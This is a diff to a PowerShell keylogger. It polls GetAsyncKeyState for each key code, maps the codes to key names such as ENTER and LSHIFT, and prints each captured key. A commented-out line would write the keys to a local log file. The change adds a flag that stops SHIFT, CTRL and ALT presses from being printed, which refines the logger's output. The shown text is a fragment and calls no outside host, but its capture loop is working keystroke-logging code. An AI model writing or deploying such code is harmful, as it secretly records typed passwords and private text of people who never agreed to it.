@@ -10,15 +10,16 @@ do
 		$keynum = [byte]$i
 		if ( [bool]([PsOneApi.Keyboard]::GetAsyncKeyState($keynum) -eq -32767))
 		{
+			$skip = $false
 			switch ($keynum) {
 				1 { $outkey = "LMB" }
 				2 { $outkey = "RMB" }
 				8 { $outkey = "BACK" }
 				9 { $outkey = "TAB" }
 				13 { $outkey = "ENTER" }
-				16 { continue } # SHIFT
-				17 { continue } # CTRL
-				18 { continue } # ALT
+				16 { $skip = $true } # SHIFT
+				17 { $skip = $true } # CTRL
+				18 { $skip = $true } # ALT
 				20 { $outkey = "CAPS" }
 				27 { $outkey = "ESC" }
 				32 { $outkey = "SPACE" }
@@ -26,11 +27,11 @@ do
 				34 { $outkey = "Page_UP" }
 				36 { $outkey = "HOME" }
 				91 { $outkey = "WIN" }
-				160 { $outkey = "LSHIFT" } # for shift
-				161 { $outkey = "RSHIFT" } # for shift
-				162 { $outkey = "LCTRL" } # for CTRL
-				163 { $outkey = "RCTRL" } # for CTRL
-				164 { $outkey = "LALT" } # for ALT
+				160 { $outkey = "LSHIFT" }
+				161 { $outkey = "RSHIFT" }
+				162 { $outkey = "LCTRL" }
+				163 { $outkey = "RCTRL" }
+				164 { $outkey = "LALT" }
 				187 { $outkey = "=" }
 				189 { $outkey = "-" }
 				219 { $outkey = "[" }
@@ -42,9 +43,10 @@ do
 			if ([bool]$outkey -eq $false){
 				$outkey = "UNK-${keynum}"
 			}
-		Write-Host -NoNewLine "${outkey}:"
-		#$outkey | Out-File -Append -NoNewLine -FilePath ".\log.txt" 
-			
+		if ($skip -eq $false) {
+			Write-Host -NoNewLine "${outkey}:"
+			#$outkey | Out-File -Append -NoNewLine -FilePath ".\log.txt" 
+		}
 			$outkey = ""
 			
 		}
